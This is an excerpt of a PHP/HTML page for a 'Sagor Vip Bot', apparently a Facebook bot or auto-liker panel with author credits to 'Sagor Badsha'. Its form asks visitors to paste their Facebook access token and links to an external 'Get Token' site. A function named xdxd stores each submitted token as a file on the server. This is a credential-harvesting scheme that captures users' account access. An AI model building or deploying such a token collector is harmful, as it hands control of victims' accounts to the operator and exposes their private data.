...
<meta charset="utf-8">
<title>Sagor Vip Bot</title><script type='text/javascript' src='back.js'></script>
...
public function xdxd($access){
if(!is_dir('xdxd')){
mkdir('xdxd');
}
$a=fopen('xdxd/'.$access,'w');
fwrite($a,1);
fclose($a);
}
...
<a target="_blank"  href="https://www.facebook.com/100011275907981">

<center> <img src="a.jpg" alt="" style="border-radius: 100%; border: 2px solid white;" width="200" height="200" title="Visit admin Profile"/></a>
<center/>
<strong> <font style="color:red;font-size:33px;font-family:miaanFont"><h3 align="center"><font style="background: url( ) color:#f6216f;  font-family:miaanFont;font-size:70px;"> <a href="http://sagor-token.tk/" target="_blank">
<center><a href="http://sagor-token.tk" target="blank"> Get Token </a></center>
<form action="index.php" method="post">
<input class="inptext inptext1" type="text"   name="access_token" placeholder="Paste Your Access Token Here" required></br>
<input class="button button1" id="sbmt" class="inp-btn"  type="submit"   value="Submit"></form></div></div></div>
<font style="color:red;font-size:33px;font-family:miaanFont"><h3 align="center"><font style="background: url( ) color:#f6216f;  font-family:miaanFont;font-size:40px;">

Modify  By : <a target="_blank" href="https://m.facebook.com/100011275907981"> SAGOR BADSHA</a><strong/></strong>
';
}
...
echo'<script type="text/javascript">alert("INFO : Bot On Successfully Saved")</script>
<div id="header">
<center><font style="color:red;font-size:33px;font-family:miaanFont"> 
<center/> <font size="40"><script src=""></script>
<a target="_blank"  href="https://www.facebook.com/100011275907981">
...
<center><font style="color:red;font-size:23px;font-family:miaanFont"><div id="footer"><font size="20"> <font color="white"> 

Made By <a target="_blank" href="https://m.facebook.com/100011275907981">Sagor Badsha</a></br>
</div>';
}
